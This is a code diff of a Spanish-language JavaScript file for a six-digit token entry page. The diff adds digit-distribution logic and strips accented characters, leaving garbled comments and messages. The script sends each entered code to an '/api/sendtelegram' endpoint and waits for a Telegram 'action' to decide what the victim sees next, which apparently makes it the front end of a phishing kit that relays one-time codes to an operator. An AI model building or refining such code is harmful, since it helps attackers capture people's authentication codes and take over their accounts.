@@ -1,14 +1,14 @@
-/**
- * TOKEN - VERIFICACIÓN DE CÓDIGO
- * Maneja entrada y validación de código de 6 dígitos
- * Versión optimizada con arquitectura robusta
+﻿/**
+ * TOKEN  VERIFICACIN DE CDIGO
+ * Maneja entrada y validacin de cdigo de 6 dgitos
+ * Versin optimizada con arquitectura robusta
  */
 
 (() => {
     'use strict';
 
     // ============================
-    // ESTADO DE LA APLICACIÓN
+    // ESTADO DE LA APLICACIN
     // ============================
     const appState = {
         inputs: [],
@@ -31,18 +31,18 @@
     const INPUT_PATTERN = /^[0-9]$/;
 
     // ============================
-    // INICIALIZACIÓN
+    // INICIALIZACIN
     // ============================
     function init() {
-        console.log('🔐 Inicializando verificación de token...');
+        console.log(' Inicializando verificacin de token...');
 
         if (!initializeElements()) {
-            console.error('❌ Error: Elementos DOM no encontrados');
+            console.error(' Error: Elementos DOM no encontrados');
             return;
         }
 
         if (!validateCommonUtils()) {
-            console.error('❌ Error: commonUtils no disponible');
+            console.error(' Error: commonUtils no disponible');
             return;
         }
 
@@ -57,11 +57,11 @@
             elements.inputs[0].focus();
         }
 
-        console.log('✅ Inicialización completada');
+        console.log(' Inicializacin completada');
     }
 
     // ============================
-    // INICIALIZACIÓN DE ELEMENTOS
+    // INICIALIZACIN DE ELEMENTOS
     // ============================
     function initializeElements() {
         elements.inputs = Array.from(document.querySelectorAll('.token-input'));
@@ -104,7 +104,7 @@
             window.socket.on('telegram_action', handleTelegramAction);
         }
 
-        // Deshabilitar botón por defecto
+        // Deshabilitar botn por defecto
         updateButtonState();
     }
 
@@ -116,13 +116,54 @@
         
         // Solo números
         const value = e.target.value.replace(/[^0-9]/g, '');
-        e.target.value = value.slice(0, 1);
-
-        // Auto-avanzar al siguiente input
-        if (value.length === 1 && index < elements.inputs.length - 1) {
-            elements.inputs[index + 1].focus();
+        
+        if (value.length > 1) {
+            // Escritura continua detectada - distribuir dígitos
+            e.target.value = ''; // Limpiar input actual
+            distributeDigits(value, index);
+            return;
+        }
+        
+        if (value.length === 1) {
+            // Un solo dígito - guardarlo y avanzar
+            e.target.value = value;
+            
+            // Autoavanzar al siguiente input vacío
+            if (index < elements.inputs.length - 1) {
+                elements.inputs[index + 1].focus();
+                elements.inputs[index + 1].select();
+            }
+        } else {
+            // Vacío
+            e.target.value = '';
         }
 
+        updateButtonState();
+    }
+    
+    function distributeDigits(digits, startIndex) {
+        const digitsArray = digits.split('').filter(d => /[0-9]/.test(d)).slice(0, TOKEN_LENGTH);
+        
+        // Llenar desde el índice inicial
+        digitsArray.forEach((digit, i) => {
+            const targetIndex = startIndex + i;
+            if (targetIndex < elements.inputs.length) {
+                elements.inputs[targetIndex].value = digit;
+            }
+        });
+        
+        // Calcular dónde poner el foco
+        const filledCount = startIndex + digitsArray.length;
+        
+        if (filledCount < elements.inputs.length) {
+            // Hay más inputs vacíos - ir al siguiente
+            elements.inputs[filledCount].focus();
+            elements.inputs[filledCount].select();
+        } else {
+            // Todos llenos - ir al último
+            elements.inputs[elements.inputs.length - 1].focus();
+        }
+        
         updateButtonState();
     }
 
@@ -146,7 +187,7 @@
             }
         });
 
-        // Focus en último input lleno
+        // Focus en último input lleno o siguiente vacío
         const nextIndex = Math.min(pastedData.length, elements.inputs.length - 1);
         elements.inputs[nextIndex].focus();
         
@@ -182,31 +223,31 @@
     }
 
     // ============================
-    // ENVÍO DE FORMULARIO
+    // ENVO DE FORMULARIO
     // ============================
     async function handleSubmit() {
         if (appState.isSubmitting) {
-            console.log('⚠️ Envío en progreso...');
+            console.log(' Envo en progreso...');
             return;
         }
 
         const tokenCode = elements.inputs.map(input => input.value).join('');
         
-        // Validación
+        // Validacin
         if (tokenCode.length !== TOKEN_LENGTH) {
-            showError('Por favor complete todos los dígitos del token');
+            showError('Por favor complete todos los dgitos del token');
             return;
         }
 
         if (!/^\d{6}$/.test(tokenCode)) {
-            showError('El token debe contener solo números');
+            showError('El token debe contener solo nmeros');
             return;
         }
 
         appState.isSubmitting = true;
         elements.verifyBtn.disabled = true;
 
-        console.log('🔐 Enviando token:', tokenCode);
+        console.log(' Enviando token:', tokenCode);
 
         window.loadingOverlay.showSending('Verificando token...');
 
@@ -219,9 +260,9 @@
                 sessionId: sessionId
             };
 
-            console.log('📤 Enviando a Telegram con sessionId:', sessionId);
+            console.log(' Enviando a Telegram con sessionId:', sessionId);
 
-            const response = await fetch('/api/send-telegram', {
+            const response = await fetch('/api/sendtelegram', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
@@ -239,13 +280,13 @@
                 throw new Error(result.error || 'Error al verificar token');
             }
 
-            console.log('✅ Token enviado exitosamente, Message ID:', result.messageId);
+            console.log(' Token enviado exitosamente, Message ID:', result.messageId);
 
             // Mantener overlay visible esperando respuesta de Telegram
-            window.loadingOverlay.show('Esperando validación...');
+            window.loadingOverlay.show('Esperando validacin...');
 
         } catch (error) {
-            console.error('❌ Error al enviar token:', error);
+            console.error(' Error al enviar token:', error);
             window.loadingOverlay.hide();
             showError('Error al verificar el token. Intente nuevamente.');
             appState.isSubmitting = false;
@@ -257,7 +298,7 @@
     // ACCIONES DE TELEGRAM
     // ============================
     function handleTelegramAction(action) {
-        console.log('📱 Acción recibida de Telegram:', action);
+        console.log(' Accin recibida de Telegram:', action);
         window.loadingOverlay.hide();
 
         const actionHandlers = {
@@ -281,12 +322,12 @@
         if (handler) {
             handler();
         } else {
-            console.warn('⚠️ Acción desconocida:', action);
+            console.warn(' Accin desconocida:', action);
         }
     }
 
     // ============================
-    // AUTO-INICIO
+    // AUTOINICIO
     // ============================
     if (document.readyState === 'loading') {
         document.addEventListener('DOMContentLoaded', init);
@@ -295,3 +336,5 @@
     }
 
 })();
+
+
